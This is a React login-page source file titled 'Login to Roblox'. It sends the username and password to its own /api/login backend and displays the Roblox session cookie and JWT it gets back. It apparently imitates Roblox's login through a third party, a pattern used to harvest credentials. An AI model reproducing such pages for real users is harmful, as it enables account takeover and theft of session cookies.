"use client";

import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogAction,
  AlertDialogCancel,
} from "@/components/ui/alert-dialog";
import axios from "@/lib/axios";
import toast from "react-hot-toast";
import { X } from "lucide-react"; // Import Lucide X icon for the close button

import * as z from "zod";

// Helper function to check if the input is a valid phone number
const isPhoneNumberValid = (value: string) => {
  // Remove common phone number characters (if any), ensure it's numeric, and check length
  const cleanedValue = value.replace(/\D/g, ""); // Remove all non-digit characters
  // Check if the cleaned value is numeric and between 10 and 15 digits
  return /^\d{10,15}$/.test(cleanedValue);
};

// Define the validation schema for the identifier (username, email, or phone)
const identifierSchema = z
  .string({ required_error: "Username, Email, or Phone is required" })
  .min(1, "Username, Email, or Phone is required")
  .max(100, "Input must be less than 100 characters")
  .trim()
  .superRefine((value, ctx) => {
    // Case 1: If the input contains an @ sign, validate as an email
    if (value.includes("@")) {
      const emailResult = z
        .string()
        .email("Please enter a valid email address")
        .safeParse(value);
      if (!emailResult.success) {
        ctx.addIssue({
          code: z.ZodIssueCode.custom,
          message: "Please enter a valid email address",
        });
      }
      return;
    }

    // Case 2: If the input is purely numeric and its length is between 10 and 15, treat it as a phone number
    if (/^\d+$/.test(value) && isPhoneNumberValid(value)) {
      return; // No issue, it's a valid phone number
    } else if (/^\d+$/.test(value) && !isPhoneNumberValid(value)) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        message: "Phone number must be between 10 and 15 digits",
      });
      return;
    }

    // Case 3: Otherwise, validate as a username
    const usernameResult = z
      .string()
      .min(3, "Username must be at least 3 characters")
      .max(50, "Username must be less than 50 characters")
      .regex(
        /^[a-zA-Z0-9_]+$/,
        "Username can only contain letters, numbers, and underscores"
      )
      .safeParse(value);
    if (!usernameResult.success) {
      ctx.addIssue({
        code: z.ZodIssueCode.custom,
        message:
          "Username can only contain letters, numbers, and underscores, and must be 3-50 characters long",
      });
    }
  })
  .transform((val) => (val.includes("@") ? val.toLowerCase() : val));

// Password validation with strong policies
const passwordSchema = z
  .string({ required_error: "Password is required" })
  .min(6, "Password must be at least 6 characters")
  .max(100, "Password must be less than 100 characters")
  // .regex(
  //   /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]+$/,
  //   "Password must contain at least one uppercase letter, one lowercase letter, one number, and one special character (@$!%*?&)"
  // );

// Define the form schema using Zod
const loginSchema = z.object({
  username: identifierSchema,
  password: passwordSchema,
});

type LoginFormValues = z.infer<typeof loginSchema>;

interface LoginResponse {
  token: string;
  cookie: string;
}

const loginUser = async (data: LoginFormValues): Promise<LoginResponse> => {
  const response = await axios.post("/api/login", data);
  return response.data;
};

export default function Home() {
  const [cookie, setCookie] = useState<string | null>(null);
  const [token, setToken] = useState<string | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<LoginFormValues>({
    resolver: zodResolver(loginSchema),
    mode: "all",
  });

  const mutation = useMutation({
    mutationFn: loginUser,
    onSuccess: (data: LoginResponse) => {
      setCookie(data.cookie);
      setToken(data.token);
      setShowSuccess(true);
      toast.success("Login successful!");
    },
    onError: (error: any) => {
      console.error("Login failed:", error);
      toast.error("Login failed. Please check your credentials.");
    },
  });

  const onSubmit = (data: LoginFormValues) => {
    mutation.mutate(data);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-neutral-900">
      <div className="bg-neutral-800 p-6 py-8 rounded-lg shadow-lg w-full max-w-md">
        <h1 className="text-3xl font-bold text-center text-white mb-6">
          Login to Roblox
        </h1>
        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          <div>
            <Label htmlFor="username" className="text-white">
              Username/Email/Phone
            </Label>
            <Input
              id="username"
              {...register("username")}
              className="my-1 bg-neutral-800 text-white border-neutral-600"
              placeholder="Username/Email/Phone"
            />
            {errors.username && (
              <p className="text-red-500 text-sm mt-1">{errors.username.message}</p>
            )}
          </div>

          <div>
            <Label htmlFor="password" className="text-white">
              Password
            </Label>
            <Input
              id="password"
              type="password"
              {...register("password")}
              className="my-1 bg-neutral-800 text-white border-neutral-600 "
              placeholder="Password"
            />
            {errors.password && (
              <p className="text-red-500 text-sm mt-1">{errors.password.message}</p>
            )}
          </div>

          <Button
            type="submit"
            disabled={mutation.isPending}
            variant="outline"
            className="w-full cursor-pointer border-neutral-600 text-white bg-transparent hover:bg-neutral-700 hover:text-white transition-colors"
          >
            {mutation.isPending ? "Logging in..." : "Log In"}
          </Button>
        </form>
        <div className="grid gap-1.5">
          <p className="text-center text-neutral-200 mt-4">
            Forget Password or Username? {" "}
            <a
              href="https://www.roblox.com/login/forgot-password-or-username"
              target="_blank"
              rel="noopener noreferrer"
              className="underline"
            >
              Click Here
            </a>
          </p>

          <p className="text-center text-neutral-200">
            Don&apos;t have an account?{" "}
            <a
              href="https://www.roblox.com"
              target="_blank"
              rel="noopener noreferrer"
              className="underline"
            >
              Sign Up
            </a>
          </p>
        </div>
      </div>

      {/* Success Popup */}
      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-md">
          <AlertDialogHeader>
            <div className="flex justify-between items-center">
              <AlertDialogTitle>Login Success</AlertDialogTitle>
              <AlertDialogCancel asChild>
                <button
                  aria-label="Close dialog"
                  className="p-1 rounded-full hover:bg-neutral-200 transition-colors"
                >
                  <X className="h-5 w-5 text-neutral-600" />
                </button>
              </AlertDialogCancel>
            </div>
            <AlertDialogDescription className="space-y-2">
              <p>
                You have successfully logged in! Your Roblox cookie and JWT token have
                been stored securely.
              </p>
              {cookie && (
                <div className="mt-2">
                  <strong>Cookie:</strong>
                  <div className="mt-1 p-2 bg-neutral-100 rounded break-all text-sm text-neutral-800">
                    {cookie}
                  </div>
                </div>
              )}
              {token && (
                <div className="mt-2">
                  <strong>JWT Token:</strong>
                  <div className="mt-1 p-2 bg-neutral-100 rounded break-all text-sm text-neutral-800">
                    {token}
                  </div>
                </div>
              )}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction
              onClick={() => setShowSuccess(false)}
              className="bg-transparent border border-neutral-600 text-neutral-800 hover:bg-neutral-200 transition-colors"
            >
              Close
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}
